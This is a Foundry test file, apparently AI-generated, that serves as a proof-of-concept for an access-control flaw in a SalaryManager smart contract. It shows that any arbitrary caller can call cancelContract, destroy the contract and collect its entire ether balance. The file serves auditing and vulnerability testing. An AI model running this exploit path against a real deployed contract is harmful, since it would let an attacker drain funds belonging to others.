// Generation Time: 11,74s
// Input Tokens: 1995
// Output Tokens: 259
// Reasoning Tokens: 1509


// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SalaryManager} from "../src/SalaryManager.sol";

contract TestAccessControlSalaryManager is Test {
    SalaryManager internal salaryManager;

    function setUp() public {
        salaryManager = new SalaryManager();
        vm.deal(address(salaryManager), 10 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);

        uint256 contractBalance = address(salaryManager).balance;
        vm.assume(contractBalance > 0);

        uint256 callerStartingBalance = caller.balance;

        vm.prank(caller);
        salaryManager.cancelContract();

        assertEq(address(salaryManager).code.length, 0);
        assertEq(caller.balance, callerStartingBalance + contractBalance);
    }
}
